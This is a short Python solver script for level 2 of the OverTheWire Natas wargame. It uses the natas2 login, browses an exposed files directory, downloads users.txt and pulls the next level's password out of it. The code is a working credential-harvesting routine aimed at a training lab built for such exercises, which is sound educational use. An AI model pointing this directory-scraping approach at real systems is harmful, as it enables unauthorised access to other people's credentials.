#!/usr/bin/env python3
"""
Natas Level 2 Solver
Author: AlperKurtulus
Date: 2025-11-12
"""

import requests
import re


def solve_natas2():
    url = "http://natas2.natas.labs.overthewire.org/"
    username = "natas2"

    # Read the password for natas2 from a file
    with open("natas2_password.txt", "r") as f:
        password = f.read().strip()
        print("[*] Solving Natas2...")

    files_url = url + "files/"

    try:
        files_response = requests.get(
            files_url, auth=(username, password), timeout=10
        )
        if files_response.status_code != 200:
            print(f"[-] Error: Status code {files_response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"[-] Network error: {e}")
        return None

    if "users.txt" not in files_response.text:
        print("[-] users.txt not found in directory listing")
        return None

    users_url = files_url + "users.txt"

    try:
        response = requests.get(users_url, auth=(username, password), timeout=10)
        if response.status_code != 200:
            print(f"[-] Error fetching users.txt: Status code {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"[-] Network error: {e}")
        return None

    match = re.search(r"\s?natas3:(\w+)", response.text)

    if match:
        next_password = match.group(1)
        print(f"Password found: {next_password}")

        with open("natas3_password.txt", "w") as f:
            f.write(next_password)
        return next_password

    print("[-] Password not found in users.txt")
    return None


if __name__ == "__main__":
    solve_natas2()
